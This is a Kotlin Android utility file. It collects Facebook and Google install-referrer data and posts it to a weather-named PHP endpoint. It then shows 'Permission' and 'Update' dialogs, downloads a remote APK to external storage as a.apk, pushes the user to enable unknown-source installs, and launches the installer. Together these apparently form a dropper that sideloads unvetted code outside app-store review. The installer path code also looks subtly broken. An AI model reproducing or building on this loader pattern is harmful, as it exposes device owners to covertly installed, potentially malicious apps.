package com.xxxxxxh.lib

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.LayoutInflater
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import androidx.annotation.RequiresApi
import androidx.core.content.FileProvider
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.bumptech.glide.Glide
import com.facebook.applinks.AppLinkData
import com.yarolegovich.lovelydialog.LovelyCustomDialog
import com.zhouyou.http.EasyHttp
import com.zhouyou.http.callback.DownloadProgressCallBack
import com.zhouyou.http.callback.SimpleCallBack
import com.zhouyou.http.exception.ApiException
import es.dmoral.prefs.Prefs
import org.greenrobot.eventbus.EventBus
import java.io.File

@SuppressLint("StaticFieldLeak")
object CommonUtils {


    var progressBar: ProgressBar? = null
    var downloadDlg: LovelyCustomDialog? = null

    fun getFacebookInfo(context: Context): String {
        var appLink = ""
        if (TextUtils.isEmpty(Prefs.with(context).read("facebook"))) {
            AppLinkData.fetchDeferredAppLinkData(context) {
                appLink = it?.targetUri?.toString() ?: "Applink is empty"
                if (!TextUtils.equals(appLink, "Applink is empty")) {
                    Prefs.with(context).write("facebook", appLink)
                }
            }
        } else {
            appLink = Prefs.with(context).read("facebook")
        }

        return appLink
    }

    fun getGoogleInfo(context: Context): String {
        var installReferrer = ""
        if (TextUtils.isEmpty(Prefs.with(context).read("google"))) {
            val ref = InstallReferrerClient.newBuilder(context).build()
            ref.startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    installReferrer =
                        if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) {
                            ref.installReferrer.installReferrer
                        } else {
                            "Referrer is empty"
                        }
                    if (!TextUtils.equals(installReferrer, "Referrer is empty")) {
                        Prefs.with(context).write("google", installReferrer)
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {
                    installReferrer = "Referrer is empty"
                }

            })
        } else {
            installReferrer = Prefs.with(context).read("google")
        }

        return installReferrer
    }

    fun update(requestData: String) {
        val url = "http://smallfun.xyz/worldweather361/weather1.php"
        EasyHttp.post(url)
            .params("data", requestData)
            .execute<String>(object : SimpleCallBack<String>() {
                override fun onError(e: ApiException?) {
                    EventBus.getDefault().post(MessageEvent("onError"))
                }

                override fun onSuccess(t: String?) {
                    EventBus.getDefault().post(MessageEvent("onSuccess", t!!))
                }
            })
    }

    fun createPermissionDlg(context: Context, imgUrl: String, imgId: Int) {
        val v = LayoutInflater.from(context).inflate(R.layout.dialog_permission, null)
        val imageView = v.findViewById<ImageView>(R.id.img)
        Glide.with(context).load(imgUrl).placeholder(imgId).into(imageView)
        LovelyCustomDialog(context)
            .setTitle("Permission")
            .setView(v)
            .setListener(R.id.tv_ok, true) { EventBus.getDefault().post(MessageEvent("perOk")) }
            .show()
    }

    fun createUpdateDlg(context: Context, content: String, path: String) {
        val v = LayoutInflater.from(context).inflate(R.layout.dialog_update, null)
        val tv: TextView = v.findViewById(R.id.update)
        tv.text = content
        LovelyCustomDialog(context)
            .setTitle("Update")
            .setView(v)
            .setListener(R.id.btn, true) { EventBus.getDefault().post(MessageEvent("update")) }
            .show()
    }

    fun createDownloadDlg(context: Context): LovelyCustomDialog {
        val view = LayoutInflater.from(context).inflate(R.layout.dialog_download, null)
        progressBar = view.findViewById(R.id.progress_bar)
        val dlg: LovelyCustomDialog = LovelyCustomDialog(context)
        dlg.setView(view)
        dlg.setTitle("Download")
        return dlg
    }

    fun download(context: Context, url: String) {
        EasyHttp.downLoad(url)
            .savePath(Environment.getExternalStorageDirectory().toString())
            .saveName("a.apk")
            .execute(object : DownloadProgressCallBack<String>() {
                override fun onStart() {
                    Log.i("xxxxxxH","onStart")
                }

                override fun onError(e: ApiException?) {
                    Log.i("xxxxxxH","onError: ${e.toString()}")
                }

                override fun update(bytesRead: Long, contentLength: Long, done: Boolean) {

                    if (downloadDlg == null) {
                        downloadDlg = createDownloadDlg(context)
                    }
                    downloadDlg!!.show()
                    val progress = (bytesRead * 100 / contentLength).toInt()
                    Log.i("xxxxxxH","update: ${progress.toString()}")
                    progressBar?.let {
                        it.progress = progress
                    }
                }

                override fun onComplete(path: String?) {
                    Log.i("xxxxxxH","onComplete")
                    EventBus.getDefault().post(MessageEvent("onComplete", path))
                    downloadDlg?.dismiss()
                    installApk(context)
                }
            })
    }

    fun installApk(context: Context) {
        val path =
            File(Environment.getExternalStorageDirectory().toString() + File.separator)

        if (Build.VERSION.SDK_INT > 24) {
            val intent = Intent()
            intent.action = Intent.ACTION_VIEW
            intent.addCategory(Intent.CATEGORY_DEFAULT)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            intent.setDataAndType(
                FileProvider.getUriForFile(
                    context,
                    "$context.packageName.fileprovider",
                    path
                ), "application/vnd.android.package-archive"
            )
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            if (context.packageManager.queryIntentActivities(intent, 0).size > 0) {
                context.startActivity(intent)
            }
        } else {
            val intent = Intent(Intent.ACTION_VIEW)
            intent.putExtra("name", "")
            intent.addCategory("android.intent.category.DEFAULT")
            val packageName: String = context.packageName
            val data = FileProvider.getUriForFile(
                context,
                "$packageName.fileprovider",
                File(
                    Environment.getExternalStorageDirectory().toString() + File.separator + "a.apk"
                )
            )
            intent.setDataAndType(data, "application/vnd.android.package-archive")
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        }
    }

    fun addReceiver(context: Context): BroadcastReceiver {
        return object : BroadcastReceiver() {
            override fun onReceive(p0: Context?, p1: Intent?) {
                if (p1?.action == Intent.ACTION_PACKAGE_ADDED) {
                    val data = p1.dataString.toString()
                    data.let {
                        Log.e("Install-apk:", it)
                        if (data.contains(context.packageName.toString())) {
                            Prefs.with(context).writeBoolean("state", true)
                        }
                    }
                }
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    fun allowThirdInstall(context: Context, activity: Activity) {
        if (Build.VERSION.SDK_INT > 24) {
            if (!context.packageManager.canRequestPackageInstalls()) {
                val uri = Uri.parse("package:" + context.packageName)
                val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                activity.startActivityForResult(i, 1)
            }
        }
    }
}